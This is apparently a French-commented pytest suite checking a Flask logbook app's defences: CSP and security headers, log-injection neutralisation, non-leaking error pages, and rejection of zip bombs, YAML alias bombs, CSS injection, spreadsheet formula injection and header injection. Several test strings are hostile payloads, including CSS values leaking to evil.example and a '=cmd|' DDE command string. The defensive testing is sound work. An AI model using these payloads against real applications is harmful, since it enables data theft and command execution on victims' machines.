"""En-têtes, CSP, journal de sécurité, erreurs, téléversements, YAML/CSS, exports."""
import io
import re
import zipfile
from pathlib import Path

import pytest

from conftest import ADMIN_PW, USER_PW, Web, events

TEMPLATES = Path(__file__).resolve().parents[1] / "app" / "templates"


def test_security_headers_on_every_kind_of_response(app, admin):
    for response in (admin.get("/accounts/me"), Web(app).get("/login"), Web(app).get("/nope"), admin.get("/healthz")):
        h = response.headers
        csp = h["Content-Security-Policy"]
        assert "script-src 'self' 'nonce-" in csp and "'unsafe-inline'" not in csp.split("style-src")[0] and "unsafe-eval" not in csp
        assert "frame-ancestors 'none'" in csp and "object-src 'none'" in csp and "base-uri 'none'" in csp
        assert h["X-Content-Type-Options"] == "nosniff" and h["X-Frame-Options"] == "DENY"
        assert h["Referrer-Policy"] == "same-origin" and "geolocation=()" in h["Permissions-Policy"]
        assert h["Cache-Control"] == "no-store" and "Strict-Transport-Security" not in h
    assert Web(app).get("/static/app.js").headers["X-Content-Type-Options"] == "nosniff"


def test_csp_nonce_is_fresh_per_request_and_matches_inline_scripts(app, admin):
    a, b = admin.get("/logbook-db"), admin.get("/logbook-db")
    nonce = lambda r: re.search(r"nonce-([\w-]+)", r.headers["Content-Security-Policy"]).group(1)
    assert nonce(a) != nonce(b)
    body = a.get_data(as_text=True)
    assert body.count(f'nonce="{nonce(a)}"') >= 2 and "cdn.jsdelivr" not in body


def test_hsts_only_when_enabled_and_secure(make_app):
    app = make_app(HSTS_ENABLED=True)
    assert "max-age=31536000" in Web(app).get("/login").headers["Strict-Transport-Security"]


def test_csp_report_only_switch(make_app):
    h = Web(make_app(CSP_REPORT_ONLY=True)).get("/login").headers
    assert "Content-Security-Policy-Report-Only" in h and "Content-Security-Policy" not in h


def test_templates_have_no_inline_handlers_external_hosts_or_nonceless_scripts():
    for path in TEMPLATES.glob("*.html"):
        text = path.read_text()
        assert not re.findall(r"\son[a-z]+\s*=", text), f"{path.name} : gestionnaire d'événement inline"
        assert not re.findall(r'(?:src|href)=["\']https?://', text), f"{path.name} : ressource externe"
        assert not re.findall(r"<script(?![^>]*nonce)[^>]*>", text), f"{path.name} : <script> sans nonce"
        assert "javascript:" not in text and "|safe" not in text and "innerHTML" not in text


def test_vendored_tabulator_is_served_locally(admin):
    assert admin.get("/static/vendor/tabulator/tabulator.min.js").status_code == 200
    assert admin.get("/static/vendor/tabulator/tabulator.min.css").status_code == 200


def test_version_hidden_from_anonymous_and_normal_users(app, make_user):
    from flask import Flask
    assert b"v0.2" not in Web(app).get("/login").data
    assert b"v0.2" not in make_user("alice").get("/accounts/me").data


# ------------------------- journal de sécurité -------------------------

def test_security_events_are_structured_and_utc(app, admin):
    admin.post("/accounts/new", {"username": "zoe", "password": "a remarkable passphrase 9", "role": "user"})
    e = events(app, "account_create")[0]
    assert e["ts"].endswith("+00:00") and e["ip"] == "127.0.0.1" and re.fullmatch(r"[0-9a-f]{12}", e["request_id"])
    assert e["account_id"] == 1 and "zoe" in e["target"]


def test_log_injection_is_neutralised(app, web, caplog):
    import logging; caplog.set_level(logging.INFO)
    web.login("bob\r\n2026-01-01 INFO security FORGED admin login_success", "x")
    stored = events(app, "login_failure")[0]["username"]
    assert "\n" not in stored and "\r" not in stored
    assert all("\n" not in rec.getMessage() for rec in caplog.records)


def test_retention_purges_old_events_and_failures(app):
    from app.db import accounts_connect
    from app import seclog
    with app.app_context():
        conn = accounts_connect()
        conn.execute("INSERT INTO security_events (ts,event,outcome) VALUES ('2020-01-01T00:00:00+00:00','vieux','ok')")
        conn.execute("INSERT INTO login_failures (ts,username,ip) VALUES (1.0,'x','1.1.1.1')")
        conn.commit(); conn.close()
        seclog.maybe_purge(force=True)
        assert not [e for e in seclog.list_events(1000) if e["event"] == "vieux"]
        conn = accounts_connect(); assert conn.execute("SELECT COUNT(*) FROM login_failures").fetchone()[0] == 0; conn.close()


def test_security_page_is_admin_only_and_free_of_secrets(app, admin, make_user):
    Web(app).login("admin", "wrong wrong wrong wrong")
    page = admin.get("/security").get_data(as_text=True)
    assert "login_failure" in page and "wrong wrong wrong" not in page and ADMIN_PW not in page
    assert "login_failure" in admin.get("/security", query_string={"event": "login_failure"}).get_data(as_text=True)
    assert "login_success" not in admin.get("/security", query_string={"event": "login_failure"}).get_data(as_text=True)
    assert make_user("alice").get("/security").status_code == 403


def test_sensitive_actions_are_audited(app, admin):
    admin.post("/accounts/new", {"username": "yan", "password": "likes long passphrases 5 times", "role": "user"})
    from app.accounts import get_account_by_username
    with app.app_context():
        yid = get_account_by_username("yan")["id"]
    admin.post(f"/accounts/{yid}/edit", {"role": "admin", "active": "1", "password": "reset by admin passphrase 8"})
    admin.post(f"/accounts/{yid}/delete")
    admin.post("/data/clear")
    seen = {e["event"] for e in events(app)}
    assert {"account_create", "account_role_change", "password_reset_by_admin", "account_delete", "data_destroy"} <= seen


# ------------------------- erreurs -------------------------

def test_internal_errors_do_not_leak_details(app, admin):
    def boom(*a, **k):
        raise RuntimeError("SECRET-INTERNAL /srv/app/appdata/db password=hunter2")
    app.view_functions["main.logbook"] = boom
    for headers in ({}, {"Sec-Fetch-Mode": "cors"}):
        r = admin.get("/logbook", headers=headers)
        assert r.status_code == 500 and b"SECRET-INTERNAL" not in r.data and b"hunter2" not in r.data and b"Traceback" not in r.data


def test_unexpected_exception_message_is_not_flashed(app, admin, monkeypatch):
    def boom(*a, **k):
        raise RuntimeError("SECRET-INTERNAL sqlite path /srv/x")
    monkeypatch.setattr("app.main.refresh_logbook", boom, raising=False)
    r = admin.post("/logbook/refresh", headers={"Referer": "https://localhost/"})
    page = admin.get("/logbook-db").get_data(as_text=True)
    assert "SECRET-INTERNAL" not in page and "SECRET-INTERNAL" not in r.get_data(as_text=True)
    assert "An internal error occurred" in page                       # le message générique est bien affiché (test non vacueux)


def test_error_pages_have_reference_and_no_stack(app, admin):
    r = admin.get("/nope")
    assert r.status_code == 404 and "Reference" in r.get_data(as_text=True) and "Traceback" not in r.get_data(as_text=True)


# ------------------------- téléversements, YAML, CSS, formules -------------------------

def test_upload_size_limit(make_app):
    app = make_app(MAX_CONTENT_LENGTH=2048)
    w = Web(app); w.login()
    r = w.post("/import", {"files": (io.BytesIO(b"a,b\n" + b"1,2\n" * 5000), "big.csv")}, content_type="multipart/form-data")
    assert r.status_code == 413


def test_zip_bomb_is_refused_before_parsing():
    from app.uploads import check_xlsx
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("xl/worksheets/sheet1.xml", b"\0" * (30 * 1024 * 1024))     # ~30 Mo décompressés, quelques Ko compressés
    with pytest.raises(ValueError, match="excessive"):
        check_xlsx(buf.getvalue())
    with pytest.raises(ValueError):
        check_xlsx(b"not a zip at all")


def test_yaml_aliases_and_anchors_are_rejected():
    from app.yamledit import Problem, parse
    bomb = "a: &a [x,x,x,x,x,x,x,x,x]\nb: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]\nc: [*b,*b,*b,*b,*b,*b,*b,*b,*b]\n"
    with pytest.raises(Problem, match="anchors"):
        parse(bomb)


@pytest.mark.parametrize("bad", ["x;}body{background:url(//evil.example/?c)", "Arial'};alert(1)//", "red; position:fixed", "url(javascript:1)"])
def test_css_injection_values_are_rejected_and_sanitised(bad):
    from app import cssafe
    assert cssafe.style_problems({"font_family": bad}) and cssafe.style_problems({"header_background": bad}) and cssafe.style_problems({"border": bad})
    layout = cssafe.sanitize_layout({"styles": {"font_family": bad, "header_background": bad, "border": bad, "text_align": bad}})
    assert "evil" not in str(layout) and "alert" not in str(layout) and layout["styles"]["font_family"] == "Arial"


def test_malicious_layout_in_user_file_never_reaches_the_page(app, admin):
    import yaml
    from app.db import users_root
    with app.app_context():
        path = users_root() / "admin" / "admin_layout.yml"
        assert path.exists(), "fichier de layout introuvable : le test serait vacueux"
        data = yaml.safe_load(path.read_text()) if path.exists() else {}
        data = data or {}
        data["styles"] = {"font_family": "x;}body{background:url(//evil.example/leak)", "border": "1px solid red;}"}
        path.write_text(yaml.safe_dump(data))
    page = admin.get("/logbook").get_data(as_text=True)
    assert "evil.example" not in page and "font-family:Arial" in page.replace(" ", "")   # retombé sur la valeur par défaut


def test_formula_injection_is_neutralised():
    from app.uploads import neutralize_formula as n
    for bad in ("=cmd|' /C calc'!A0", "+1+cmd", "@SUM(1+1)", "-2+3+cmd", "\t=1", "=HYPERLINK(\"http://x\")"):
        assert n(bad).startswith("'"), bad
    for ok in ("-1.5", "+12", "12", "hello", "", None, 5, "-0,5"):
        assert n(ok) == ok


def test_download_name_is_sanitised(admin):
    r = admin.get("/export/download/doesnotexist", query_string={"name": '"; filename*=evil\r\nX-Injected: 1'})
    assert "X-Injected" not in str(r.headers)
